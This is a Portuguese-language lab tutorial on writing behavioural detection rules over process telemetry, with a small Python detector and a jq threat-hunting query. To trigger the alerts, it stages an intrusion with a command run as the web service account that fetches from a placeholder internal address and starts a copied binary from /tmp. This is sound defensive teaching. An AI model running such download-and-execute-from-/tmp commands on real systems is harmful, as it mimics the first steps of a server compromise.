---
title: Regras sobre a telemetria
version: 1
---

**Uma regra transforma uma pilha de registros nos poucos que uma pessoa deve ler.** O `web` vai
gravar centenas de linhas de processo por hora sem fazer nada de incomum, e ninguém lê centenas de
linhas por hora. Uma regra é a descrição de algo de que o trabalho da máquina nunca precisa,
conferida contra cada linha.

Boas regras descrevem comportamento, não arquivos, e as melhores vêm de conhecer a máquina. O
portal serve uma página e confere a própria saúde. Nunca inicia um shell, nunca baixa nada e nunca
roda um programa a partir de `/tmp`. Cada uma dessas coisas é uma regra, e nenhuma precisa saber como
é um malware em particular. Salve isto como `detect.py` no seu home no `web`:

```schooling-example
{"language": "python", "file": "detect.py", "parts": [{"code": "#!/usr/bin/env python3\n\"\"\"detect.py: read the sensor's lines and print the ones a rule matches.\"\"\"\nimport json, os, sys\n\nSHELLS = {\"bash\", \"sh\", \"dash\"}", "note": "Uma regra de detecção é uma pergunta feita a cada linha de telemetria, e este arquivo tem três delas. O sensor coleta; as regras decidem o que merece a atenção de uma pessoa. Manter os dois separados é o que deixa mudar uma regra e rodá-la de novo sobre a telemetria de ontem."}, {"code": "RULES = [\n    (\"a shell running as the portal's account\",\n     lambda e: e[\"user\"] == \"portal\" and os.path.basename(e[\"exe\"]) in SHELLS),\n    (\"a program run from /tmp or /dev/shm\",\n     lambda e: e[\"exe\"].startswith((\"/tmp/\", \"/dev/shm/\"))),\n    (\"a download tool run by a service account\",\n     lambda e: e[\"user\"] in {\"portal\", \"www-data\"} and os.path.basename(e[\"exe\"]) in {\"curl\", \"wget\"}),\n]", "note": "Cada regra descreve um comportamento, nunca um arquivo. O portal nunca precisa de shell, então um shell como `portal` quer dizer que algo o fez rodar um. `/tmp` e `/dev/shm` são graváveis por qualquer conta, então um programa iniciado dali é um que alguém copiou para lá. E uma conta de serviço baixando coisas é o passo que costuma ficar entre esses dois."}, {"code": "for line in open(sys.argv[1]):\n    e = json.loads(line)\n    for name, rule in RULES:\n        if rule(e):\n            print(f'{e[\"time\"]} {e[\"host\"]} {name}: pid {e[\"pid\"]} '\n                  f'{e[\"cmd\"]!r} under {\" < \".join(e[\"parents\"])}')", "note": "Um alerta traz o que um analista precisa para começar: quando, onde, qual regra, o processo e os pais dele, lidos da esquerda para a direita, do filho ao avô."}]}
```

## Um incidente, encenado no seu laboratório

Agora faça a conta do portal fazer o que ela nunca faz. `sudo -u portal` faz o papel do que, na vida
real, leva uma aplicação web a rodar um comando para o qual não foi escrita; na sua máquina é só você,
pegando a conta emprestada. O comando tenta um download de `192.168.60.99`, um endereço onde nada
responde, copia `/bin/sleep` para `/tmp/update` e deixa essa cópia rodando por dez minutos:

```
ana@web:~$ sudo -u portal bash -c 'curl -s -m 2 http://192.168.60.99/x; cp /bin/sleep /tmp/update; /tmp/update 600 &'
```

O prompt voltou na hora, e nada no `web` parece diferente: o portal continua servindo a página, e
nenhum arquivo que alguém varreria mudou. Pergunte às regras:

```
ana@web:~$ python3 detect.py /var/log/sensor.jsonl
2026-10-23T02:02:07-0300 web a shell running as the portal's account: pid 190 'bash -c curl -s -m 2 http://192.168.60.99/x; cp /bin/sleep /tmp/update; /tmp/update 600 &' under sudo < su
2026-10-23T02:02:07-0300 web a download tool run by a service account: pid 191 'curl -s -m 2 http://192.168.60.99/x' under bash < sudo < su
2026-10-23T02:02:09-0300 web a program run from /tmp or /dev/shm: pid 193 '/tmp/update 600' under 
```

**Três alertas, um por regra, com dois segundos de distância**, e lidos em ordem eles são a
história: um shell como `portal`, uma ferramenta de download iniciada por esse shell e um programa
rodando a partir de `/tmp`. Os dois primeiros trazem os pais, `sudo < su`, que no seu laboratório
são você. Num incidente de verdade, ali estariam os processos do próprio servidor web, e essa cadeia
é o que um analista seguiria primeiro.

O terceiro alerta não tem nada depois de `under`. O `/tmp/update` foi iniciado pelo shell, o shell
terminou na hora, e quando o sensor olhou, o pai do programa já era o processo 1. É a fresta da
seção anterior aparecendo como um fato faltando: **o registro não diz quem iniciou o programa que
continua rodando**, e só os alertas anteriores, casados pelo horário, o devolvem.

## Fazendo uma pergunta que nenhuma regra fez

Regras só acham o que alguém pensou. **Caçar** é fazer à telemetria guardada uma pergunta nova
depois do fato, e com um objeto JSON por linha, o `jq` basta. Tudo o que a conta do portal já rodou:

```
ana@web:~$ jq -r 'select(.user == "portal") | [.time, .cmd] | @tsv' /var/log/sensor.jsonl
2026-10-23T02:02:07-0300	bash -c curl -s -m 2 http://192.168.60.99/x; cp /bin/sleep /tmp/update; /tmp/update 600 &
2026-10-23T02:02:07-0300	curl -s -m 2 http://192.168.60.99/x
2026-10-23T02:02:09-0300	/tmp/update 600
```

Três linhas, onde um portal fazendo o seu trabalho não mostraria nenhuma, e a que falta diz tanto
quanto as três. O shell rodou `cp` entre o download e o `/tmp/update`, e os ids de processo mostram o
buraco que ele deixou: 191, depois 193. **O processo 192 foi a cópia, e terminou entre duas
olhadas.** Uma caça na telemetria é tão completa quanto o sensor, que é o argumento da última seção.
Uma caça que acha algo digno de alerta vira regra.
